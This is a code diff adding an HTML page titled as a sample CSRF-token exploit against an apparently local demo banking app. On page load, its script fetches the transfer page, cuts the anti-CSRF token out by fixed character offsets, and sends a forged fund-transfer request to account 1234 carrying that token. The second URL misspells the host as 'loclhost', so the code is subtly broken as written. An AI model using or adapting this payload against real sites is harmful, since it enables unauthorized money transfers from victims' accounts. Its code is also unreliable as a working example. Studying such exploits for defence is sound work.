@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<!--
+To change this license header, choose License Headers in Project Properties.
+To change this template file, choose Tools | Templates
+and open the template in the editor.
+-->
+<html>
+    <head>
+        <title>Sample html5 csrf token exploit</title>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <script>
+            function exploit()
+            {
+                var xmlhttp;
+                if (window.XMLHttpRequest)
+                {
+                    xmlhttp=new XMLHttpRequest();
+                }
+            else
+            {
+                xmlhttp=new ActiveXObject("Microsoft.XMLHTTP");
+            }
+            xmlhttp.open("GET","http://localhost/myBank/transfer.html",false);
+            xmlhttp.send();
+            if(xmlhttp.status==200)
+            {
+                var str=xmlhttp.responseText;
+                var n=str.search("csrfToken");
+                var final=str.substring(n+18,n+28);
+                var url = "http://loclhost/myBank/TransferFund.html?datum1%2F=06-06-2013&amp;Account=1234&amp;csrfToken="
+                        + escape(final);
+                xmlhttp.open("GET", url, true);
+                xmlhttp.send();
+            }
+        }
+</script>
+    </head>
+    <body onload="exploit();">
+    </body>
+</html>
